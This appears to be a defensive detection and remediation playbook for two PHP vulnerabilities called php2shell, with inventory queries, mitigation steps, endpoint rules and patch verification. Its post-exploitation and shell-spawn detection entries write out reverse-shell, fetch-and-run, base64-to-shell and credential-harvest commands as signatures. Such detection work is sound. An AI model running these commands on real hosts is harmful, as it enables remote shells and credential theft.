house_rules: Patch-first law: the PHP security update (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35, or a verified vendor backport) is the only complete remediation on record - every configuration action in this corpus is exposure reduction for named attack paths and every report says so.

Crash-discipline law: OOM-triggering multipart probes crash PHP workers - they are an operator decision under explicit authorization, never an agent default; this corpus hunts with passive signals and existing telemetry first (the prototype organ's no-DoS doctrine applied to a memory-safety event).

No exploit reproduction: building or firing a php2shell chain against any host requires an operator order that names the PHP layer in scope; the organ's default work is exposure inventory, passive detection, and compromise forensics.
Credential law: disclosed worker memory and harvested credential material are masked at first 8 chars in context; full values live only in engagements/ artifacts.
Read-only forensics: planted scripts are read and analyzed, never executed; staging and reverse-shell primitives appear here as detection signatures, never as runnable kit.

Probes below are canonical forms transcribed from the public record (Wiz Research, Elastic Security Labs, Huntress, the php-src advisories), attributed per entry; every growth bumps corpus_version with the entries delta on record.

entries.technique: PHP install inventory via process telemetry (ECS query)
prerequisites: an ECS-capable data view with process events (e.g. logs-endpoint.events.process-*)
a retention window covering the assessment period (the published example searches the last 7 days)
entries.probe: event.category: process and (process.name: (php* or lsphp* or frankenphp or sw-engine-fpm) or process.parent.name: (php* or lsphp* or frankenphp or sw-engine-fpm))
entries.oracle: the host set running any PHP runtime - including Windows php.exe/php-cgi.exe forms and vendor-bundled runtimes visible through parent-process matches; each host becomes one inventory FACT row with process.executable and container.id where available
failure_modes: inactive installations never appear in process telemetry - the record's own caveat: missing results do not establish that PHP is absent; follow with the on-disk inventory (P2S-002)
container filesystems are inspected separately - host-level queries miss them
rarely-invoked runtimes (cron-only php-cli) can fall outside the retention window; widen the window or fall to package queries

source.title: php2shell: Assessing Elastic detection coverage relevant to CVE-2026-109618 and CVE-2026-109619 (find PHP through process telemetry)

entries.technique: version and SAPI exposure triage against the fixed-version set
prerequisites: host or package-manager read access for the inventory query
the fixed-version set on record: 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (anything older on a served branch is exposed; 8.1 and older are end-of-life)
entries.probe: SELECT name, version, arch, status FROM deb_packages WHERE status = 'install ok installed' AND (name LIKE 'php%' OR name LIKE 'libapache2-mod-php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine') ORDER BY name; (the rpm_packages twin on the same record)
entries.oracle: a version map per host against the fixed set, plus the SAPI row (PHP-FPM / Apache mod_php / php-cgi / FrankenPHP / LiteSpeed) - mod_php flags highest risk: an unauthenticated request can trigger the flaw before any application code runs (the PHP team's own risk ordering)
failure_modes: source-built PHP lives outside the package manager - take the version from the runtime directly or the SAPI's response signature instead
rpms.remirepo.net packages did not carry the fix on release day (the Huntress record's caveat) - treat remirepo-hosted installs as exposed until verified against the vendor advisory
distribution backports keep the old version string while carrying the fix - compare against the vendor advisory, not the raw string (the version-string trap)

prerequisites: php.ini / FPM pool / Apache config control - the directives must take effect before request parsing; ini_set() and .user.ini do not help (the record's own boundary)
entries.probe: for the OOM path (CVE-2026-109618): memory_limit=-1 set where applications cannot override (php_admin_value in the FPM pool or Apache config), post_max_size kept low, a container/cgroup limit enforced rather than RLIMIT_AS or RLIMIT_DATA; for the stale-global path (CVE-2026-109619): session.upload_progress.enabled=0 plus a restart of every worker, and on PHP 8.5 fatal_error_backtraces=0
entries.oracle: each directive verified effective at the pre-parse layer (loaded configuration, not runtime), with the report stating these are exposure reduction for the named attack paths only - the PHP team's own position on record: no complete mitigation exists and updating is the only safe choice
failure_modes: treating any single toggle as complete - the record explicitly warns against guidance that presents one config change as a full solution
workers not restarted - disabling session upload progress requires restarting every worker to take effect; a config edit alone is theater
memory_limit=-1 removes the OOM abort but widens unbounded-allocation exposure elsewhere - the tradeoff is on record and is the operator's call, never the agent's default

source.credit: Elastic Security Labs (quoting the PHP security advisory's mitigation section) + Huntress (end-of-life guidance)

entries.technique: remote memory disclosure detection - the response-cookie oracle (passive)
prerequisites: access to web-server and PHP-FPM error logs plus response capture for the in-scope hosts

the four published signals on watch: unusual multipart requests followed by memory-limit errors or repeated HTTP 500 responses, unexpectedly large or malformed PHPSESSID response cookies, unexplained PHP worker churn
entries.probe: passive watch (no crafted requests): alert on the four-signal quad above; on a hit, capture the response set - the malformed PHPSESSID response cookie is the evidence carrier (URL-encoded heap contents published by a request the worker survived)
entries.oracle: a PHPSESSID response cookie carrying URL-encoded worker-heap contents is the disclosure verdict - an attacker-sized region of live worker memory, including data from outside the attacker's request, disclosed even when the application never calls session_start() (the record's application-agnostic property); credential material inside leaked bytes follows the masking law
failure_modes: these bugs execute below the application layer - application logs may contain little context (the record's own warning); the watch rides web-server and PHP-FPM logs instead
worker pools churn for operational reasons too - pair churn with the multipart/500 signals before escalating; single-signal alerts are leads
cookie size baselines vary per application - baseline the normal PHPSESSID shape first, then flag the outlier; malformed beats merely large

source.title: PHP2Shell: AI uncovers critical RCE vulnerabilities affecting 70% of the Internet (defender guidance + the remote process-memory disclosure bug)

entries.technique: behavioral detection - web-server parent spawns a shell (convergent rule)
prerequisites: process telemetry with parent lineage (EDR endpoint events or auditd)
the convergent law on record: detect the outcome, not the trigger - a PHP RCE ends in a request-serving process doing what a request-serving process should not do
entries.probe: process where event.type == "start" and event.action == "exec" and process.parent.interactive == false and (process.parent.name in ("apache2", "httpd", "nginx", "php-cgi") or process.parent.name like ("php-fpm*", "lsphp*")) and process.name in ("bash", "dash", "sh", "zsh", "ksh") and process.args in ("-c", "-cl", "-lc") and (process.command_line like~ ("*/dev/tcp*", "*|*base64 -d*", "*curl*", "*wget*", "*/etc/shadow*") or process.args in ("id", "whoami", "hostname")) (transcribed from the published endpoint rule; the wp2shell precedent run ended in sh -c -- id; whoami; hostname)
entries.oracle: a non-interactive web-server parent launching a shell with a high-risk command line - the tightest signal that code execution just succeeded regardless of which vulnerability opened the door; on hosts without endpoint detection, process-watcher in observe mode is the free stand-in
failure_modes: SIEM-only deployments alert but do not terminate - prevention rides the endpoint layer; state which layer fired
fileless variants (account creation, in-memory staging) can slip the shell-spawn rule - the record's own honesty note; the child-process and file-creation layers (P2S-007) are the second net
legitimate control panels schedule through the web stack - new_terms baselining (which command lines each parent normally runs) separates routine from fresh

source.credit: Elastic Security Labs (endpoint rule predicate) + Huntress (process-watcher and the PHP child-process observation)

entries.technique: post-exploitation flow detection (the convergent sequence, passive log sweep)
prerequisites: web-server access logs, PHP logs, and process events for the sweep window
the MITRE mapping on record: T1190 (Exploit Public-Facing Application) at entry, T1059 (Command and Scripting Interpreter) and T1505.003 (Server Software Component: Web Shell) after execution
entries.probe: sweep logs for the published convergent sequence: access-proof commands (id, whoami, uname -a, hostname, cat /etc/os-release) -> escalation enumeration (sudo -l, find / -perm -u=s -type f, getcap -r /, reads of /etc/passwd and /etc/shadow) -> interpreter staging (python3 -c, perl -e, ruby -e, node -e, php -r) -> second-stage retrieval (curl -O, wget -O, curl http(s)://... | bash, wget -qO- http(s)://... | sh) -> inline decode (echo <b64> | base64 -d | sh, openssl enc -d, xxd -r) -> reverse-shell primitives (bash -i >& /dev/tcp/<ip>/<port> 0>&1, mkfifo with nc, socat, python pty.spawn, php fsockopen) -> credential harvest (.env, ~/.aws/credentials, /var/run/secrets/kubernetes.io/ service-account tokens, 169.254.169.254)
entries.oracle: the sequence plus web-context parentage ties the actions to a compromised PHP worker - each step alone can be benign operations; the PARENT LINEAGE and the ordering are the discriminators; a confirmed flow hands off to adversary-tracker's Binary Brain (event-triggered branch) for the hypothesis hunt
failure_modes: each command is individually legitimate - never alert on a single command without the parentage join; the record builds detection on the convergent flow precisely because no exploit string exists
coverage gaps remain on record (account creation, fileless execution paths) - state the uncovered classes in the report instead of claiming the sweep is complete
credential-harvest reads are impact-bearing evidence: mask secrets at first 8 chars, artifacts under engagements/

source.credit: Elastic Security Labs (the post-exploitation flow catalog)

entries.technique: planted-script drop detection in the web root
prerequisites: file-event telemetry (creation and rename) with the parent process recorded
a web-root path inventory per in-scope host
entries.probe: watch for: new executable or script content (.php / .phtml) written into the web root by a web-server parent outside deployment windows; double-extension forms such as avatar.php.jpg slipping upload validation; high-entropy content written with a web-executable extension (the encoded-payload signature)
entries.oracle: a web-server process writing new executable content into the web root is abnormal outside a deployment - the planted-script verdict; the dropped file is read forensically and never executed; polyglot-disguised files get format analysis before any verdict is written
failure_modes: legitimate deploys create the same event shape - new_terms baselining (which files this parent normally touches) separates routine from planted
staged files can land outside the web root first (/tmp, /dev/shm, /var/tmp - the suspicious-path list on the same record) - sweep those paths as part of the flow
a double extension alone is not a verdict - upload-validation bypass is the hypothesis; content analysis is the proof

source.title: php2shell: File creation - the PHP webshell drop (rule family incl. File with High Entropy Created by Web Server)

entries.technique: patch verification and the honest close-out
prerequisites: the disclosure timeline on record: details leaked 2026-10-20 ahead of embargo; emergency release and public disclosure 2026-10-21
entries.probe: per host: confirm the runtime sits in the fixed set (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35) or carries a verified vendor backport; for source builds the PHP team's patch commit 31c0ea7d7ff1d1fccb6492e52dab544011628065 is the lineage to verify; end-of-life branches (8.1 and older) get the minimal source backports (7.4 / 8.0 / 8.1) or isolation
entries.oracle: the report states per host: patched / backported / EOL-isolated / exposed-with-monitoring - carrying the event facts: both CVEs rated CVSS v4.0 9.2 (GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp), every PHP version of the last decade affected back to 5.4, watchTowr reproduced CVE-2026-109618, and no in-the-wild exploitation observed at disclosure (the Huntress fleet baseline)
failure_modes: container base images lag the running containers - rebuilt images are the verification target, not just the live instances
vendor backports keep old version strings - verify against the vendor advisory (the same version-string trap as P2S-002)
EOL isolation claims need the isolation evidenced (network segment, WAF, VPN-only reach) - an unpatched internet-facing EOL host is an open finding, never a parked one
